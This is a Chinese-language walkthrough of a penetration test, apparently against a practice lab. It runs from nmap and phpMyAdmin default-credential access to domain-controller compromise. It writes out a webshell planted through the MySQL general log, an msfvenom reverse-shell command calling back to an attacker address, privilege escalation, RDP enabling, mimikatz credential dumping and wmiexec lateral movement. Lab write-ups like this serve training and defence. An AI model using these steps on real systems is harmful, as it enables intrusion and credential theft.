过程

外网打点

先nmap扫描win7。开放80 , 3306端口

进入80端口，首页是php探针页面

dirsearch扫描后。发现phpmyadmin页面。尝试默认密码root:root。进入phpmyadmin页面

网络上查询phpmyadmin拿shell有两个方式

1.通过执行sql语句直接写shell。
条件:

  • 对web目录具有写权限
  • 知道网站决定路径
  • secure_file_priv没有具体值

通过show global variables like '%secure%';查看站点file_priv值为null。无法直接写Shell

2.通过mysql全局日志写Shell
查看日志配置
SHOW VARIABLES LIKE '%general%'
当前全局日志关闭.记录当前全局日志位置为:
C:\phpStudy\MySQL\data\stu1.log

开启全局日志
set global general_log = on;
修改目录位置为shell地址
set global general_log_file='C:\\phpStudy\\WWW\\shell.php';

同时访问192.168.1.12/shell.php可以访问到目录内容

现在写入shell
select '<?php eval($_POST[cmd]);?>'
使用蚁剑可以成功连接
现在将日志选项还原到之前的值

使用msf生成一个shell并上传到win7
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.6 port=4444 -f exe -o /root/shell.exe

使用蚁剑运行shell获得meterpreter shell。

域内信息收集

ipconfig后发现另外的网段192.168.53/24

内网

使用msf windows/local/service_permissions模块获得目标System权限
尝试添加用户

使用msf开启RDP post/windows/manage/enable_rdp

使用远程桌面登录到本地计算机，上传mimikatz开始抓密码
发现域管理员密码为hongrisec@2022

使用wmiexec获得DC的system权限
